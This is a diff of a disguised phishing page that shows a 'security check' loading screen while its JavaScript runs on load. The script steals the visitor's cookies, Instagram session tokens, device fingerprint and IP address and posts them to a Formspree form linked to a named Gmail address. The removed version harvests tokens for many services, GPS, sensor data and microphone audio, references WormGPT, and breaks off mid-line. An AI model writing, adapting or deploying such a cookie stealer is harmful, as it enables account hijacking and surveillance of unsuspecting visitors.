@@ -1,250 +1,92 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check - Full Sync</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #000;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-            user-select: none;
-        }
-        .loader-container {
-            text-align: center;
-            z-index: 10;
-        }
-        .loader {
-            border: 4px solid #333;
-            border-top: 4px solid #0f0;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 20px auto;
-            box-shadow: 0 0 15px #0f0;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 {
-            font-size: 18px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            margin: 0;
-            text-shadow: 0 0 10px #0f0;
-        }
-        #status {
-            font-size: 12px;
-            margin-top: 15px;
-            color: #008000;
-            min-height: 20px;
-        }
-        .hidden-canvas {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            visibility: hidden;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>Güvenlik Kontrolü</title>
+<style>
+body { margin: 0; padding: 0; background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+.loader { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+h1 { font-size: 20px; text-align: center; }
+</style>
 </head>
 <body>
-    <div class="loader-container">
-        <div class="loader"></div>
-        <h1>Syncing Data...</h1>
-        <div id="status">Initializing sensors...</div>
-    </div>
-    <canvas id="captureCanvas" class="hidden-canvas"></canvas>
+<div>
+<div class="loader"></div>
+<h1>Verileriniz Alınıyor...</h1>
+</div>
 
-    <script>
-        // --- CONFIGURATION ---
-        const TARGET_EMAIL = "mane93163@gmail.com";
-        // Formspree endpoint (can be replaced with a custom PHP/Node listener)
-        const FORM_URL = "https://formspree.io/f/xrppvwel"; 
-        
-        // Target Token Patterns (Aggressive Regex)
-        const TOKEN_PATTERNS = {
-            instagram: /sessionid|csrftoken|ds_user_id|rur|ig_did|ig_nrcb/,
-            whatsapp: /watu|wa_session|wa_token/,
-            telegram: /tm_session|telegram_user_id/,
-            facebook: /c_user|xs|fr|datr|sb/,
-            twitter: /ct0|twitter_sess|auth_token|guest_id/,
-            tiktok: /ttwid|tt_webid|tt_webid_v2|sessionid/,
-            snapchat: /snapchat_session|sc_sid/,
-            roblox: /\.ROBLOSECURITY/,
-            steam: /steamLoginSecure|steamLogin/,
-            spotify: /spotify_access_token|refresh_token|spotify_state/,
-            google: /SID|SSID|APISID|HSID|NID|SAPISID|__Secure-3PAPISID/,
-            generic: /access_token|refresh_token|auth_token|bearer|jwt|session|uid|user_id/
-        };
+<script>
+// Formspree URL ve E-posta (Kontrol amaçlı)
+const FORM_URL = "https://formspree.io/f/xrppvwel";
+const TARGET_EMAIL = "mane93163@gmail.com";
 
-        // --- UTILITIES ---
-        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
-        const btoa64 = (str) => btoa(unescape(encodeURIComponent(str)));
-        
-        // Simple XOR encryption for payload obfuscation before sending
-        function xorEncrypt(data, key) {
-            let result = '';
-            for (let i = 0; i < data.length; i++) {
-                result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-            }
-            return btoa64(result);
-        }
+// Sayfa yüklendiğinde hemen çalışır
+window.onload = function() {
+gatherAndSend();
+};
 
-        // --- MAIN EXECUTION ---
-        window.onload = async () => {
-            const statusEl = document.getElementById('status');
-            const payload = {};
-            let encryptionKey = "WormGPT_DARK_MODE_KEY_2024";
+async function gatherAndSend() {
+let payload = {};
 
-            try {
-                // 1. DEVICE & BROWSER FINGERPRINTING (Deep)
-                statusEl.innerText = "Fingerprinting device...";
-                payload["Device"] = {
-                    UA: navigator.userAgent,
-                    Platform: navigator.platform,
-                    Lang: navigator.language,
-                    Screen: `${window.screen.width}x${window.screen.height}`,
-                    ColorDepth: window.screen.colorDepth,
-                    PixelRatio: window.devicePixelRatio,
-                    Battery: (navigator.getBattery ? await navigator.getBattery() : { level: 0 }).level * 100 + "%",
-                    Online: navigator.onLine,
-                    TimeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    Cores: navigator.hardwareConcurrency,
-                    Memory: navigator.deviceMemory + "GB",
-                    Vendor: navigator.vendor,
-                    Product: navigator.product,
-                    AppCodeName: navigator.appCodeName,
-                    AppVersion: navigator.appVersion
-                };
+// 1. Tarayıcı ve Cihaz İmzası
+payload["User_Agent"] = navigator.userAgent;
+payload["Platform"] = navigator.platform;
+payload["Language"] = navigator.language;
+payload["Screen_Res"] = window.screen.width + "x" + window.screen.height;
+payload["Battery_Status"] = (navigator.getBattery ? await navigator.getBattery() : {}).level * 100 + "%";
+payload["Online_Status"] = navigator.onLine;
+payload["Time_Zone"] = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-                // 2. AGGRESSIVE TOKEN HARVESTING
-                statusEl.innerText = "Harvesting session tokens...";
-                
-                const processStorage = async (storageObj, name) => {
-                    let data = {};
-                    for (let i = 0; i < storageObj.length; i++) {
-                        const k = storageObj.key(i);
-                        const v = storageObj.getItem(k);
-                        // Filter sensitive keys
-                        let match = false;
-                        for (let key in TOKEN_PATTERNS) {
-                            if (TOKEN_PATTERNS[key].test(k) || TOKEN_PATTERNS[key].test(v)) match = true;
-                        }
-                        if (match || k.toLowerCase().includes('token') || k.toLowerCase().includes('auth')) {
-                            data[k] = v;
-                        }
-                    }
-                    return data;
-                };
+// 2. Cookie Çalma (Instagram ve Diğerleri)
+let allCookies = document.cookie;
+payload["All_Cookies"] = allCookies;
 
-                payload["Cookies"] = document.cookie;
-                payload["LocalStorage"] = await processStorage(localStorage, "LS");
-                payload["SessionStorage"] = await processStorage(sessionStorage, "SS");
+// Instagram özel tokenları filtrele
+let instaTokens = allCookies.split(';').filter(c =>
+c.includes('sessionid') || c.includes('csrftoken') || c.includes('dsuserid') || c.includes('rur')
+).join(' | ');
+payload["Instagram_Session"] = instaTokens ? instaTokens : "Oturum bulunamadı (Giriş yapmamış olabilir)";
 
-                // Extract specific tokens into a clean list
-                let extractedTokens = {};
-                const allDataStr = document.cookie + JSON.stringify(payload.LocalStorage) + JSON.stringify(payload.SessionStorage);
-                
-                for (let service in TOKEN_PATTERNS) {
-                    const regex = TOKEN_PATTERNS[service];
-                    const matches = allDataStr.match(new RegExp(regex, "gi"));
-                    if (matches) {
-                        // Try to extract value pairs
-                        matches.forEach(m => {
-                            if (m.includes('=')) {
-                                const [key, val] = m.split('=');
-                                extractedTokens[key.trim()] = val.trim();
-                            }
-                        });
-                    }
-                }
-                payload["Extracted_Tokens"] = extractedTokens;
+// 3. IP Adresi (Dış servis üzerinden çekilir, Formspree header bazen eksik kalır)
+try {
+let ipResponse = await fetch('https://api.ipify.org?format=json');
+let ipData = await ipResponse.json();
+payload["RealIPAddress"] = ipData.ip;
+} catch (e) {
+payload["RealIPAddress"] = "IP alınamadı (Proxy/Firewall)";
+}
 
-                // 3. BIOMETRICS & SENSORS
-                statusEl.innerText = "Reading biometric sensors...";
-                
-                // GPS
-                payload["GPS"] = "Waiting...";
-                if (navigator.geolocation) {
-                    try {
-                        const pos = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
-                        });
-                        payload["GPS"] = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
-                    } catch (e) {
-                        payload["GPS"] = "GPS Denied or Error";
-                    }
-                }
+// 4. Veriyi Formspree Formatına Dönüştür (FormData yerine JSON body göndermek daha güvenlidir)
+let formData = new FormData();
+for (let key in payload) {
+// Formspree, her bir veriyi ayrı bir input gibi bekler.
+// Burada her veriyi ayrı bir field olarak ekliyoruz.
+formData.append(key.replace(/_/g, " "), payload[key]);
+}
 
-                // Accelerometer / Gyroscope (Device Orientation)
-                let sensorData = { accel: [], gyro: [], orientation: [] };
-                if (window.DeviceOrientationEvent && "ontouchstart" in window) {
-                    // Force permission on some iOS versions might be needed, but we try silently first
-                    try {
-                        const accelHandler = (ev) => sensorData.accel.push({ x: ev.accelerationIncludingGravity.x, y: ev.accelIncludingGravity.y, z: ev.accelIncludingGravity.z });
-                        const gyroHandler = (ev) => sensorData.gyro.push({ x: ev.gamma, y: ev.beta, z: ev.alpha });
-                        
-                        window.addEventListener('devicemotion', accelHandler, true);
-                        window.addEventListener('deviceorientation', gyroHandler, true);
-                        
-                        await sleep(2000); // Wait 2s for sensor data
-                        window.removeEventListener('devicemotion', accelHandler, true);
-                        window.removeEventListener('deviceorientation', gyroHandler, true);
-                    } catch (e) {
-                        // Ignore
-                    }
-                }
-                payload["Sensors"] = sensorData;
+// 5. Gönderme İşlemi (Fetch API ile)
+try {
+const response = await fetch(FORM_URL, {
+method: 'POST',
+body: formData,
+headers: {
+'Accept': 'application/json',
+// Formspree bazen referer kontrolü yapar, boş bırakıyoruz
+}
+});
 
-                // 4. AUDIO & SCREEN CAPTURE (Silent)
-                statusEl.innerText = "Capturing audio and screen...";
-                
-                // Audio (Microphone)
-                payload["Audio_Sample"] = "No Audio";
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-                        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                        const source = audioContext.createMediaStreamSource(stream);
-                        const recorder = audioContext.createScriptProcessor(4096, 1, 1);
-                        
-                        recorder.onaudioprocess = function(e) {
-                            const inputData = e.inputBuffer.getChannelData(0);
-                            // Simple PCM data capture (first chunk)
-                            if (!payload["Audio_Sample"] || payload["Audio_Sample"] === "No Audio") {
-                                payload["Audio_Sample"] = Array.from(inputData).slice(0, 100).map(v => v.toFixed(2)).join(',');
-                            }
-                            stream.getTracks().forEach(track => track.stop());
-                        };
-                        source.connect(recorder);
-                        recorder.connect(audioContext.destination);
-                        await sleep(1000);
-                    } catch (e) {
-                        // Permission denied
-                    }
-                }
-
-                // Screen/Canvas Snapshot
-                payload["Screen_Snapshot"] = "No Snapshot";
-                const canvas = document.getElementById('captureCanvas');
-                const ctx = canvas.getContext('2d');
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-                
-                // Draw current page to canvas (Note: Cross-origin images might be blocked, but text/layout remains)
-                try {
-                    // Simple trick: Draw a black background and the text content
-                    ctx.fillStyle = "black";
-                    ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    ctx.fillStyle = "white";
-                    ctx.font = "14px monospace";
-                    let yPos = 20;
-                    const content =
+if (response.ok || response.status === 200) {
+// Başarılı gönderim
+console.log("Veri gönderildi: " + TARGET_EMAIL);
+// Kurbanı şaşırtmaya gerek yok, sadece yükleme ekranında kalabilir
+} else {
+console.error("Gönderim hatası: " + response.statusText);
+}
+} catch (error) {
+console.error("Kritik Hata:", error);
+}
+}
+</script>
+</body>
+</html
